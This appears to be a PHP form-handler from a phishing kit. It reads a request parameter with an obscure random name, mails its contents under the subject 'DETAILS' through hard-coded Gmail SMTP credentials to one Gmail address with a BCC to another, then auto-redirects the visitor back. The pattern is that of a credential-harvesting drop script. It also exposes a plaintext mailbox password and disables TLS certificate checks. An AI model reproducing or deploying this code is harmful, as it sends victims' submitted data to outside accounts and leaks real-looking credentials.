

<?php
$var_value = $_REQUEST['xtywuikdhophjuorvjukhjbolkjmnjbsdghjnk'];
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
   
//PHP MAILER
require $_SERVER['DOCUMENT_ROOT'] . '/mail/Exception.php';
require $_SERVER['DOCUMENT_ROOT'] . '/mail/PHPMailer.php';
require $_SERVER['DOCUMENT_ROOT'] . '/mail/SMTP.php';

$mail = new PHPMailer; //(true);
$mail->isSMTP(); 
//$mail->SMTPDebug = 2; // 0 = off (for production use) - 1 = client messages - 2 = client and server messages
$mail->Host = "smtp.gmail.com"; // use $mail->Host = gethostbyname('smtp.gmail.com'); // if your network does not support SMTP over IPv6
$mail->Port = 587; // TLS only 587
$mail->SMTPSecure = 'tls'; // ssl is deprecated
$mail->SMTPAuth = true;
$mail->Username = 'energostylg@gmail.com'; // email
$mail->Password = 'abaroad12345'; // password
$mail->setFrom('energostylg@gmail.com', 'Energo Styl Group'); // From email and name
$mail->addAddress('muhammadaddulabbas9@gmail.com', 'Al Husman LLC');
$mail->AddReplyTo('noreply@webtools.com', 'noreply');
$mail->AddBcc('vatoslotus99@gmail.com', 'noreply al_husman');
$mail->Subject = 'DETAILS';
//$mail->Body = $var_value;  "====LOGS===\n"+$var_value
$mail->msgHTML($var_value); //$mail->msgHTML(file_get_contents('contents.html'), __DIR__); //Read an HTML message body from an external file, convert referenced images to embedded,
$mail->AltBody = 'HTML messaging not supported'; // If html emails is not supported by the receiver, show this body
$mail->Send();
// $mail->addAttachment('images/phpmailer_mini.png'); //Attach an image file

 $mail->SMTPOptions = array('ssl' => array('verify_peer' => false,'verify_peer_name' => false,'allow_self_signed' => true ));

   
if(!$mail->Send()){
    echo "Mailer Error : " . $mail->ErrorInfo;
}else{  
$referer = filter_var($_SERVER['HTTP_REFERER'], FILTER_VALIDATE_URL);
    if(!empty($referer)){
echo '<p><a id="Goback" href="'.$referer.'" title="Return to the previous page">&laquo; Go back</a></p>';
echo "<script type='text/javascript'>document.getElementById('Goback').click();</script>";
       }
    else{
echo '<p><a id="Goback" href="javascript:history.go(-1)" title="Return to the previous page">&laquo; Go back</a></p>';
echo "<script type='text/javascript'>document.getElementById('Goback').click();</script>";
     }
}
?>